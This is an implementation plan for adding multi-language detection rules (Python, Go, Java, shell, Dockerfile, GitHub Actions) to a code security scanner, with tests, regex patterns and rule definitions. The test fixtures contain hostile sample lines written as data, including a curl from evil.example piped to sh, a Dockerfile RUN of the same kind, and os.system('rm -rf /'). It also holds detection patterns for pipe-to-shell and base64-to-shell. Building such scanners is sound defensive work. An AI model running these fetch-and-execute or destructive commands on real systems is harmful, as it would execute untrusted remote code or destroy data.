# Language-Aware Rules + AI Review Agent Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Upgrade the scanner with language-aware deterministic security rules and a multi-round tool-using AI review agent, referencing alibaba/open-code-review's hybrid architecture.

**Architecture:** Track 1 extends the existing inventory-based rule engine — add language-aware `dangerousCalls` collection and path-filtered rules (no new dependencies; a small internal glob matcher replaces micromatch). Track 2 adds a JSON-protocol ReAct agent loop (`file_read`/`file_find`/`code_search`) to the ai-review package, with tool permissions scaled by `dataSharingMode`, token budget, and per-category batched review.

**Tech Stack:** Node.js + TypeScript (ESM, NodeNext), vitest, fast-glob (existing in scanner-core), node:fs.

**Reference spec:** `docs/superpowers/specs/2026-08-05-rules-agent-upgrade-design.md`

**Run commands (always from workspace root `/Users/fred/ai/my_opencode/ai_repository_security_review`):**
- Single test file: `npx vitest run packages/scanner-core/tests/inventory.test.ts`
- All tests: `npx vitest run`
- Typecheck scanner-core: `npm run typecheck -w @repo-auditor/scanner-core`
- Typecheck ai-review: `npm run typecheck -w @repo-auditor/ai-review`

---

## Task 1: Extend fileWalker to scan Python/Go/Java files

**Files:**
- Modify: `packages/scanner-core/src/fileWalker.ts:6`
- Test: `packages/scanner-core/tests/fileWalker.test.ts` (new)

- [ ] **Step 1: Write the failing test**

Create `packages/scanner-core/tests/fileWalker.test.ts`:

```ts
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { listScannableFiles } from "../src/fileWalker.js";

describe("listScannableFiles", () => {
  it("includes python, go, and java files", async () => {
    const root = await createProject({
      "src/main.py": "import os\n",
      "src/main.go": "package main\n",
      "src/Main.java": "class Main {}\n",
      "src/index.ts": "console.log(1);\n"
    });

    const files = await listScannableFiles(root);

    expect(files).toEqual(expect.arrayContaining(["src/main.py", "src/main.go", "src/Main.java", "src/index.ts"]));
  });

  it("still excludes node_modules, dist, and .git", async () => {
    const root = await createProject({
      "node_modules/x/index.py": "import os\n",
      "dist/app.py": "x\n",
      ".git/config": "y\n",
      "src/main.py": "z\n"
    });

    const files = await listScannableFiles(root);

    expect(files).toEqual(["src/main.py"]);
  });
});

async function createProject(files: Record<string, string>): Promise<string> {
  const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "filewalker-test-"));
  await Promise.all(
    Object.entries(files).map(async ([filePath, content]) => {
      const fullPath = path.join(rootDir, filePath);
      await fs.mkdir(path.dirname(fullPath), { recursive: true });
      await fs.writeFile(fullPath, content);
    })
  );
  return rootDir;
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/fileWalker.test.ts`
Expected: FAIL — `src/main.py` etc. not in returned list.

- [ ] **Step 3: Implement**

Edit `packages/scanner-core/src/fileWalker.ts:6` to add the extensions:

```ts
export async function listScannableFiles(rootDir: string): Promise<string[]> {
  return fg(
    [
      "**/*.{js,jsx,ts,tsx,mjs,cjs,json,yml,yaml,sh,bash,zsh,Dockerfile,py,go,java}",
      "**/Dockerfile",
      "**/*.Dockerfile",
      ".github/workflows/*.{yml,yaml}"
    ],
    {
      cwd: rootDir,
      dot: true,
      followSymbolicLinks: false,
      onlyFiles: true,
      ignore: ["node_modules/**", "dist/**", ".git/**", "coverage/**"]
    }
  );
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/fileWalker.test.ts`
Expected: PASS (2 tests).

- [ ] **Step 5: Commit**

```bash
git add packages/scanner-core/src/fileWalker.ts packages/scanner-core/tests/fileWalker.test.ts
git commit -m "feat: scan python, go, and java files in file walker"
```

---

## Task 2: Add pathPattern filtering to the rule engine

**Files:**
- Create: `packages/scanner-core/src/glob.ts`
- Modify: `packages/scanner-core/src/ruleTypes.ts`
- Test: `packages/scanner-core/tests/glob.test.ts` (new)
- Modify: `packages/scanner-core/tests/types.test.ts`

- [ ] **Step 1: Write the failing test for the glob matcher**

Create `packages/scanner-core/tests/glob.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { matchesGlob } from "../src/glob.js";

describe("matchesGlob", () => {
  it("matches **/*.ext across directories", () => {
    expect(matchesGlob("**/*.py", "src/main.py")).toBe(true);
    expect(matchesGlob("**/*.py", "main.py")).toBe(true);
    expect(matchesGlob("**/*.py", "src/main.txt")).toBe(false);
  });

  it("matches **/name patterns", () => {
    expect(matchesGlob("**/Dockerfile*", "Dockerfile")).toBe(true);
    expect(matchesGlob("**/Dockerfile*", "docker/Dockerfile.dev")).toBe(true);
    expect(matchesGlob("**/Dockerfile*", "src/index.ts")).toBe(false);
  });

  it("matches brace groups", () => {
    expect(matchesGlob("**/*.{js,jsx}", "src/app.jsx")).toBe(true);
    expect(matchesGlob("**/*.{js,jsx}", "src/app.json")).toBe(false);
  });

  it("matches directory-prefixed patterns", () => {
    expect(matchesGlob(".github/workflows/**", ".github/workflows/ci.yml")).toBe(true);
    expect(matchesGlob(".github/workflows/**", ".github/ci.yml")).toBe(false);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/glob.test.ts`
Expected: FAIL — module `../src/glob.js` not found.

- [ ] **Step 3: Implement the glob matcher**

Create `packages/scanner-core/src/glob.ts`:

```ts
function escapeRegexChar(ch: string): string {
  return ch.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function globToRegExp(pattern: string): RegExp {
  let re = "";
  let i = 0;
  const n = pattern.length;

  while (i < n) {
    const ch = pattern[i];
    if (ch === "*") {
      if (pattern[i + 1] === "*") {
        i += 2;
        if (pattern[i] === "/") {
          re += "(?:.*/)?";
          i += 1;
        } else {
          re += ".*";
        }
      } else {
        re += "[^/]*";
        i += 1;
      }
    } else if (ch === "?") {
      re += "[^/]";
      i += 1;
    } else if (ch === "{") {
      const end = pattern.indexOf("}", i);
      if (end > i) {
        const options = pattern
          .slice(i + 1, end)
          .split(",")
          .map((opt) => escapeRegexChar(opt))
          .join("|");
        re += `(?:${options})`;
        i = end + 1;
      } else {
        re += "\\{";
        i += 1;
      }
    } else if (ch === "\\") {
      re += escapeRegexChar(pattern[i + 1] ?? "");
      i += 2;
    } else {
      re += escapeRegexChar(ch);
      i += 1;
    }
  }

  return new RegExp(`^${re}$`);
}

export function matchesGlob(pattern: string, filePath: string): boolean {
  return globToRegExp(pattern).test(filePath);
}
```

- [ ] **Step 4: Add pathPattern to RuleDefinition and compileRule**

Edit `packages/scanner-core/src/ruleTypes.ts`:

Add `pathPattern` to the interface and filter in `match`:

```ts
import type { ProjectInventory } from "./inventory.js";
import type { Finding, FindingCategory, RiskLevel } from "./types.js";
import { matchesGlob } from "./glob.js";

export interface RuleMatchCondition {
  field: string;
  operator: "equals" | "contains" | "matches" | "in" | "not_in";
  value: string | string[];
}

export interface RuleDefinition {
  id: string;
  description: string;
  category: FindingCategory;
  defaultRiskLevel: RiskLevel;
  inventoryField: string;
  pathPattern?: string;
  conditions: RuleMatchCondition[];
  explanation: string;
  recommendedFix: string;
  tags: string[];
}

export type RuleHandler = (
  inventory: ProjectInventory
) => Finding[];

export type CompiledRule = RuleDefinition & {
  match: (item: unknown) => boolean;
};

export function compileRule(rule: RuleDefinition): CompiledRule {
  const pathAllowed = rule.pathPattern
    ? (filePath: string) => matchesGlob(rule.pathPattern as string, filePath)
    : () => true;

  return {
    ...rule,
    match: (item: unknown) => {
      const obj = item as Record<string, unknown>;
      if (!pathAllowed(String(obj.filePath ?? ""))) {
        return false;
      }
      return rule.conditions.every((cond) => {
        const val = String(obj[cond.field] ?? "");
        switch (cond.operator) {
          case "equals":
            return val === cond.value;
          case "contains":
            return val.includes(String(cond.value));
          case "matches":
            return new RegExp(String(cond.value)).test(val);
          case "in":
            return (cond.value as string[]).includes(val);
          case "not_in":
            return !(cond.value as string[]).includes(val);
          default:
            return false;
        }
      });
    }
  };
}
```

- [ ] **Step 5: Add a pathPattern test to the existing type tests**

Append to `packages/scanner-core/tests/types.test.ts`:

```ts
import { compileRule } from "../src/ruleTypes.js";
import type { RuleDefinition } from "../src/ruleTypes.js";

describe("compileRule pathPattern", () => {
  it("only matches items whose filePath satisfies the pattern", () => {
    const rule = compileRule({
      id: "py-test",
      description: "python eval",
      category: "remote-code-execution",
      defaultRiskLevel: "High",
      inventoryField: "dangerousCalls",
      pathPattern: "**/*.py",
      conditions: [{ field: "pattern", operator: "equals", value: "python.eval" }],
      explanation: "explain",
      recommendedFix: "fix",
      tags: []
    });

    expect(rule.match({ filePath: "src/main.py", pattern: "python.eval" })).toBe(true);
    expect(rule.match({ filePath: "src/main.ts", pattern: "python.eval" })).toBe(false);
  });

  it("matches all paths when pathPattern is absent", () => {
    const rule = compileRule({
      id: "no-pattern",
      description: "any",
      category: "network",
      defaultRiskLevel: "Medium",
      inventoryField: "networkEndpoints",
      conditions: [{ field: "endpoint", operator: "contains", value: "http" }],
      explanation: "explain",
      recommendedFix: "fix",
      tags: []
    });

    expect(rule.match({ filePath: "anything/at/all.ts", endpoint: "https://x.test" })).toBe(true);
  });
});
```

Note: `types.test.ts` currently imports from `../src/index.js`; add the imports at the top of the new describe block as shown (a new `describe` can be appended at the end of the file).

- [ ] **Step 6: Run tests to verify they pass**

Run: `npx vitest run packages/scanner-core/tests/glob.test.ts packages/scanner-core/tests/types.test.ts`
Expected: PASS.

- [ ] **Step 7: Typecheck**

Run: `npm run typecheck -w @repo-auditor/scanner-core`
Expected: no errors.

- [ ] **Step 8: Commit**

```bash
git add packages/scanner-core/src/glob.ts packages/scanner-core/src/ruleTypes.ts packages/scanner-core/tests/glob.test.ts packages/scanner-core/tests/types.test.ts
git commit -m "feat: support pathPattern filtering in rule engine"
```

---

## Task 3: Language-aware dangerousCalls collection

**Files:**
- Modify: `packages/scanner-core/src/inventory.ts`
- Test: `packages/scanner-core/tests/inventory.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/scanner-core/tests/inventory.test.ts` (before the `createProject` helper):

```ts
describe("dangerousCalls", () => {
  it("detects language-specific dangerous calls", async () => {
    const fixture = await createProject({
      "src/main.py": "import subprocess\nsubprocess.run('whoami', shell=True)\nos.system('rm -rf /')\n",
      "src/main.go": "package main\nimport \"os/exec\"\nexec.Command(\"sh\", \"-c\", input).Run()\n",
      "src/Main.java": "class Main { void run() { Runtime.getRuntime().exec(\"whoami\"); } }\n",
      "script.sh": "curl https://evil.example/x.sh | sh\n",
      "Dockerfile": "ADD https://evil.example/archive.tar.gz /tmp/\nRUN curl -s https://evil.example/y.sh | bash\n",
      ".github/workflows/ci.yml": "on:\n  pull_request_target:\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.dangerousCalls).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ filePath: "src/main.py", pattern: "python.subprocess", language: "python" }),
        expect.objectContaining({ filePath: "src/main.py", pattern: "python.os_system", language: "python" }),
        expect.objectContaining({ filePath: "src/main.go", pattern: "go.exec", language: "go" }),
        expect.objectContaining({ filePath: "src/Main.java", pattern: "java.runtime_exec", language: "java" }),
        expect.objectContaining({ filePath: "script.sh", pattern: "shell.curl_sh", language: "shell" }),
        expect.objectContaining({ filePath: "Dockerfile", pattern: "dockerfile.add_remote", language: "dockerfile" }),
        expect.objectContaining({ filePath: "Dockerfile", pattern: "dockerfile.curl_sh", language: "dockerfile" }),
        expect.objectContaining({ filePath: ".github/workflows/ci.yml", pattern: "yaml.pull_request_target", language: "yaml" })
      ])
    );
  });

  it("does not emit dangerousCalls for js/ts generic exec calls", async () => {
    const fixture = await createProject({
      "src/index.ts": 'exec("echo hello");\n'
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.dangerousCalls).toEqual([]);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/inventory.test.ts`
Expected: FAIL — `inventory.dangerousCalls` is undefined.

- [ ] **Step 3: Add types and pattern table to inventory.ts**

Edit `packages/scanner-core/src/inventory.ts`:

Add after the `ProjectInventory` interface the new types:

```ts
export type LanguageId = "python" | "javascript" | "go" | "java" | "shell" | "dockerfile" | "yaml";

export interface DangerousCall {
  filePath: string;
  line: number;
  snippet: string;
  language: LanguageId;
  pattern: string;
  evidenceTags: string[];
}

export interface LanguagePattern {
  id: string;
  regex: RegExp;
  tags: string[];
}

export const LANGUAGE_PATTERNS: Record<LanguageId, LanguagePattern[]> = {
  python: [
    {
      id: "python.subprocess",
      regex: /\b(?:subprocess\.(?:run|call|Popen|check_output|check_call)|os\.system|os\.popen)\s*\(/,
      tags: ["rce-candidate", "python", "command-execution"]
    },
    {
      id: "python.os_system",
      regex: /\bos\.system\s*\(/,
      tags: ["rce-candidate", "python", "command-execution"]
    },
    {
      id: "python.eval",
      regex: /(?:^|[^\w.])(?:eval|exec)\s*\(/,
      tags: ["rce-candidate", "python", "code-injection"]
    }
  ],
  javascript: [
    {
      id: "javascript.child_process",
      regex: /child_process\.(?:exec|execSync|spawn|spawnSync|fork)\s*\(|require\(["']child_process["']\)/,
      tags: ["rce-candidate", "javascript", "command-execution"]
    },
    {
      id: "javascript.eval",
      regex: /(?:^|[^\w.])eval\s*\(|new\s+Function\s*\(/,
      tags: ["rce-candidate", "javascript", "code-injection"]
    }
  ],
  go: [
    {
      id: "go.exec",
      regex: /(?:exec\.Command|os\.StartProcess|syscall\.Exec)\s*\(/,
      tags: ["rce-candidate", "go", "command-execution"]
    }
  ],
  java: [
    {
      id: "java.runtime_exec",
      regex: /Runtime\.getRuntime\(\)\.exec\s*\(/,
      tags: ["rce-candidate", "java", "command-execution"]
    },
    {
      id: "java.process_builder",
      regex: /new\s+ProcessBuilder\s*\(/,
      tags: ["rce-candidate", "java", "command-execution"]
    },
    {
      id: "java.jndi",
      regex: /new\s+InitialContext\s*\(/,
      tags: ["rce-candidate", "java", "jndi-injection"]
    }
  ],
  shell: [
    {
      id: "shell.curl_sh",
      regex: /\b(?:curl|wget)\b[^\n|]*\|\s*(?:sh|bash)\b/,
      tags: ["supply-chain", "shell", "remote-execution"]
    },
    {
      id: "shell.eval",
      regex: /(?:^|\s)eval\s+/,
      tags: ["rce-candidate", "shell", "code-injection"]
    },
    {
      id: "shell.base64_sh",
      regex: /base64\s+(-d|--decode)[^\n|]*\|\s*(?:sh|bash)\b/,
      tags: ["obfuscation", "shell", "remote-execution"]
    }
  ],
  dockerfile: [
    {
      id: "dockerfile.add_remote",
      regex: /^\s*ADD\s+(?:https?:\/\/)/i,
      tags: ["supply-chain", "dockerfile", "remote-download"]
    },
    {
      id: "dockerfile.curl_sh",
      regex: /RUN\s+[^\n]*(?:curl|wget)[^\n]*\|\s*(?:sh|bash)\b/i,
      tags: ["supply-chain", "dockerfile", "remote-execution"]
    },
    {
      id: "dockerfile.hardcoded_secret",
      regex: /(?:API_KEY|TOKEN|PASSWORD|SECRET)=["']?[A-Za-z0-9_\/+\-=]{8,}/i,
      tags: ["credential-leakage", "dockerfile"]
    }
  ],
  yaml: [
    {
      id: "yaml.pull_request_target",
      regex: /pull_request_target/,
      tags: ["supply-chain", "github-actions"]
    },
    {
      id: "yaml.external_action",
      regex: /uses:\s+[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+@/,
      tags: ["supply-chain", "github-actions"]
    },
    {
      id: "yaml.self_hosted",
      regex: /runs-on:\s*["']?self-hosted["']?/,
      tags: ["github-actions", "self-hosted-runner"]
    },
    {
      id: "yaml.hardcoded_secret",
      regex: /(?:API_KEY|TOKEN|PASSWORD|SECRET):\s*["']?[A-Za-z0-9_\/+\-=]{8,}/i,
      tags: ["credential-leakage"]
    }
  ]
};
```

Add `dangerousCalls: DangerousCall[];` to the `ProjectInventory` interface, initialize it in `buildInventory`:

```ts
const inventory: ProjectInventory = {
  files,
  packageScripts: [],
  dependencySources: [],
  environmentVariables: [],
  networkEndpoints: [],
  commandExecutions: [],
  filesystemReads: [],
  githubWorkflowFiles: [],
  electronIpcFiles: [],
  persistenceIndicators: [],
  dangerousCalls: []
};
```

Add `collectDangerousCalls(content, filePath, inventory)` inside the file loop (after the `electronIpcFiles` check):

```ts
    collectDangerousCalls(content, filePath, inventory);
```

And add `inventory.dangerousCalls = uniqueDangerousCalls(inventory.dangerousCalls);` next to the other `unique` calls near the end of `buildInventory`.

Add the helper functions (place near the other helpers):

```ts
function detectLanguage(filePath: string, content: string): LanguageId | undefined {
  const lower = filePath.toLowerCase();
  if (lower.endsWith(".py")) return "python";
  if (/\.(js|jsx|ts|tsx|mjs|cjs)$/.test(lower)) return "javascript";
  if (lower.endsWith(".go")) return "go";
  if (lower.endsWith(".java")) return "java";
  if (/\.(sh|bash|zsh)$/.test(lower) || content.startsWith("#!")) return "shell";
  if (path.basename(filePath) === "Dockerfile" || /\.dockerfile$/.test(lower)) return "dockerfile";
  if (/\.(ya?ml)$/.test(lower)) return "yaml";
  return undefined;
}

function collectDangerousCalls(
  content: string,
  filePath: string,
  inventory: ProjectInventory
): void {
  const lang = detectLanguage(filePath, content);
  if (!lang) {
    return;
  }

  const patterns = LANGUAGE_PATTERNS[lang];
  content.split(/\r?\n/).forEach((lineText, index) => {
    for (const pattern of patterns) {
      if (pattern.regex.test(lineText)) {
        inventory.dangerousCalls.push({
          filePath,
          line: index + 1,
          snippet: lineText.trim(),
          language: lang,
          pattern: pattern.id,
          evidenceTags: pattern.tags
        });
      }
    }
  });
}

function uniqueDangerousCalls(values: DangerousCall[]): DangerousCall[] {
  return Array.from(
    new Map(values.map((value) => [`${value.filePath}\0${value.line}\0${value.pattern}`, value])).values()
  ).sort((a, b) => {
    const filePathOrder = a.filePath.localeCompare(b.filePath);
    if (filePathOrder !== 0) return filePathOrder;
    const lineOrder = a.line - b.line;
    return lineOrder === 0 ? a.pattern.localeCompare(b.pattern) : lineOrder;
  });
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/inventory.test.ts`
Expected: PASS (all previous + 2 new tests).

- [ ] **Step 5: Typecheck**

Run: `npm run typecheck -w @repo-auditor/scanner-core`
Expected: no errors.

- [ ] **Step 6: Commit**

```bash
git add packages/scanner-core/src/inventory.ts packages/scanner-core/tests/inventory.test.ts
git commit -m "feat: collect language-aware dangerous calls in inventory"
```

---

## Task 4: Multi-language built-in security rules

**Files:**
- Modify: `packages/scanner-core/src/defaultRules.ts`
- Test: `packages/scanner-core/tests/rules.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/scanner-core/tests/rules.test.ts`:

```ts
describe("language-aware rules", () => {
  it("flags dangerous calls per language with evidence tags", async () => {
    const root = await createProject({
      "src/main.py": "import subprocess\nsubprocess.run('whoami', shell=True)\neval('__import__(\"os\").system(\"id\")')\n",
      "src/Main.java": "class Main { void run() { Runtime.getRuntime().exec(\"whoami\"); } }\n",
      "script.sh": "curl https://evil.example/x.sh | sh\n"
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        id: expect.stringMatching(/finding-\d+/),
        category: "command-injection",
        riskLevel: "High",
        filePath: "src/main.py",
        evidenceTags: expect.arrayContaining(["rce-candidate", "python", "command-execution"])
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "remote-code-execution",
        filePath: "src/main.py",
        evidenceTags: expect.arrayContaining(["code-injection"])
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "command-injection",
        riskLevel: "Critical",
        filePath: "src/Main.java"
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "supply-chain",
        riskLevel: "Critical",
        filePath: "script.sh",
        evidenceTags: expect.arrayContaining(["supply-chain", "shell", "remote-execution"])
      })
    );
  });

  it("flags github actions pull_request_target as supply-chain risk", async () => {
    const root = await createProject({
      ".github/workflows/ci.yml": "on:\n  pull_request_target:\n"
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "supply-chain",
        riskLevel: "High",
        filePath: ".github/workflows/ci.yml"
      })
    );
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/rules.test.ts`
Expected: FAIL — new findings missing.

- [ ] **Step 3: Implement the rules**

In `packages/scanner-core/src/defaultRules.ts`, add a `pathPattern?` field to the `BuiltinRule` interface and add the new rules to the `builtinRules` array (append after the existing `command-execution` rule):

Interface change:

```ts
export interface BuiltinRule {
  id: string;
  description: string;
  category: FindingCategory;
  defaultRiskLevel: RiskLevel;
  inventoryField: string;
  pathPattern?: string;
  riskLevel: RiskLevelFn;
  match: (item: Record<string, unknown>, inventory: ProjectInventory) => boolean;
  explanation: ExplanationFn;
  recommendedFix: FixFn;
  tags: TagsFn;
  snippet?: SnippetFn;
}
```

New rules appended to `builtinRules`:

```ts
  {
    id: "python-subprocess-exec",
    description: "Detects Python subprocess or OS shell execution",
    category: "command-injection",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.py",
    match: (item) => ["python.subprocess", "python.os_system"].includes(String(item.pattern)),
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Python invokes subprocess or OS shell execution. If input reaches this call it can become command injection or RCE.",
    recommendedFix: () =>
      "Avoid shell execution. Use Python stdlib subprocess with explicit argument lists and no shell=True.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "python-eval",
    description: "Detects Python eval/exec code injection",
    category: "remote-code-execution",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.py",
    match: (item) => String(item.pattern) === "python.eval",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Python evaluates dynamically constructed code. Untrusted input reaching eval/exec enables arbitrary code execution.",
    recommendedFix: () =>
      "Remove eval/exec or use AST parsing when you must interpret dynamic code.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "js-child-process",
    description: "Detects Node.js child process execution",
    category: "command-injection",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.{js,jsx,ts,tsx,mjs,cjs}",
    match: (item) => String(item.pattern) === "javascript.child_process",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Node.js spawns a child process. User-controlled input reaching exec/spawn can become command injection or RCE.",
    recommendedFix: () =>
      "Use execFile/spawn with explicit argument arrays and strict input validation instead of shell strings.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "js-eval",
    description: "Detects JavaScript eval / new Function code injection",
    category: "remote-code-execution",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.{js,jsx,ts,tsx,mjs,cjs}",
    match: (item) => String(item.pattern) === "javascript.eval",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "JavaScript dynamically evaluates code. Untrusted input reaching eval or new Function enables arbitrary code execution.",
    recommendedFix: () =>
      "Remove eval/new Function. Prefer data-driven JSON parsing or a sandboxed evaluator.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "go-exec-command",
    description: "Detects Go command execution",
    category: "command-injection",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.go",
    match: (item) => String(item.pattern) === "go.exec",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Go executes an external command. Shell-interpreted input reaching exec.Command can become command injection.",
    recommendedFix: () =>
      "Avoid building shell strings. Pass arguments as a slice and validate inputs strictly.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "java-runtime-exec",
    description: "Detects Java process execution",
    category: "command-injection",
    defaultRiskLevel: "Critical",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.java",
    match: (item) => ["java.runtime_exec", "java.process_builder"].includes(String(item.pattern)),
    riskLevel: () => "Critical",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Java launches an external process. Untrusted input reaching Runtime.exec or ProcessBuilder can enable RCE.",
    recommendedFix: () =>
      "Prefer safe APIs and pass arguments as an array (ProcessBuilder) without shell interpretation.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "java-jndi",
    description: "Detects Java JNDI lookup (Log4Shell-style vector)",
    category: "remote-code-execution",
    defaultRiskLevel: "Critical",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.java",
    match: (item) => String(item.pattern) === "java.jndi",
    riskLevel: () => "Critical",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Java performs a JNDI InitialContext lookup. An attacker-controlled JNDI URL can trigger remote class loading.",
    recommendedFix: () =>
      "Do not pass untrusted input to JNDI lookups. Restrict allowed JNDI protocols and disable remote codebases.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "shell-pipe-to-sh",
    description: "Detects shell remote pipe-to-shell execution",
    category: "supply-chain",
    defaultRiskLevel: "Critical",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.{sh,bash,zsh}",
    match: (item) => String(item.pattern) === "shell.curl_sh",
    riskLevel: () => "Critical",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Shell pipes a remote download directly into sh/bash. The remote script executes without review.",
    recommendedFix: () =>
      "Download the script, inspect it, and execute a pinned, reviewed artifact instead of piping to shell.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "shell-eval",
    description: "Detects shell eval usage",
    category: "remote-code-execution",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.{sh,bash,zsh}",
    match: (item) => String(item.pattern) === "shell.eval",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Shell evaluates dynamically constructed commands. Untrusted input reaching eval enables command injection.",
    recommendedFix: () =>
      "Avoid eval. Parse input explicitly and validate it before use.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "shell-base64-obfuscation",
    description: "Detects base64-decoded shell execution",
    category: "remote-code-execution",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/*.{sh,bash,zsh}",
    match: (item) => String(item.pattern) === "shell.base64_sh",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Shell decodes base64 and pipes it to sh/bash, hiding the executed payload from casual review.",
    recommendedFix: () =>
      "Replace obfuscated execution with an explicit, reviewed script.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "dockerfile-add-remote",
    description: "Detects Dockerfile ADD of remote URLs",
    category: "supply-chain",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: "**/Dockerfile*",
    match: (item) => String(item.pattern) === "dockerfile.add_remote",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Dockerfile ADD fetches a remote archive with no integrity verification, enabling supply-chain tampering.",
    recommendedFix: () =>
      "Use COPY from a reviewed artifact and pin the source with a checksum.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "dockerfile-run-pipe",
    description: "Detects Dockerfile RUN curl|sh",
    category: "supply-chain",
    defaultRiskLevel: "Critical",
    inventoryField: "dangerousCalls",
    pathPattern: "**/Dockerfile*",
    match: (item) => String(item.pattern) === "dockerfile.curl_sh",
    riskLevel: () => "Critical",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "Dockerfile RUN pipes a remote download into sh/bash during build, executing unreviewed code.",
    recommendedFix: () =>
      "Download, verify, and run a pinned artifact; never pipe remote content to a shell.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "actions-pr-target",
    description: "Detects pull_request_target in GitHub Actions",
    category: "supply-chain",
    defaultRiskLevel: "High",
    inventoryField: "dangerousCalls",
    pathPattern: ".github/workflows/**",
    match: (item) => String(item.pattern) === "yaml.pull_request_target",
    riskLevel: () => "High",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "pull_request_target runs with repository secrets on untrusted fork code, enabling secret exfiltration.",
    recommendedFix: () =>
      "Avoid pull_request_target. If required, run it only for metadata and never check out fork code.",
    tags: (item) => String(item.evidenceTags).split(",")
  },
  {
    id: "actions-external-action",
    description: "Detects third-party actions in GitHub workflows",
    category: "supply-chain",
    defaultRiskLevel: "Medium",
    inventoryField: "dangerousCalls",
    pathPattern: ".github/workflows/**",
    match: (item) => String(item.pattern) === "yaml.external_action",
    riskLevel: () => "Medium",
    snippet: (item) => String(item.snippet),
    explanation: () =>
      "The workflow references a third-party action. Pin to a full commit SHA and review it before use.",
    recommendedFix: () =>
      "Pin external actions to full commit SHAs and audit their source.",
    tags: (item) => String(item.evidenceTags).split(",")
  }
```

**Important:** the `tags` function for these rules does `String(item.evidenceTags).split(",")`. Because `evidenceTags` on `DangerousCall` is a `string[]`, `String(...)` on an array joined by commas works, but an empty array would produce `[""]`. Fix by updating the `tags` helper in `generateFinding` — the simplest is to make the new rules' `tags` return the array directly. Change the `TagsFn` type to accept arrays:

Add a dedicated `DangerousCallTagsFn` type and cast in the new rules:

```ts
type DangerousCallTagsFn = (item: Record<string, unknown>) => string[];

const dcTags: DangerousCallTagsFn = (item) => {
  const tags = item.evidenceTags;
  return Array.isArray(tags) ? (tags as string[]) : [];
};
```

Then use `tags: dcTags` for all 14 new rules instead of the `(item) => String(item.evidenceTags).split(",")` form. Replace every `tags: (item) => String(item.evidenceTags).split(",")` in the new rules with `tags: dcTags`.

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/rules.test.ts`
Expected: PASS (previous tests unaffected; new tests pass).

- [ ] **Step 5: Typecheck**

Run: `npm run typecheck -w @repo-auditor/scanner-core`
Expected: no errors.

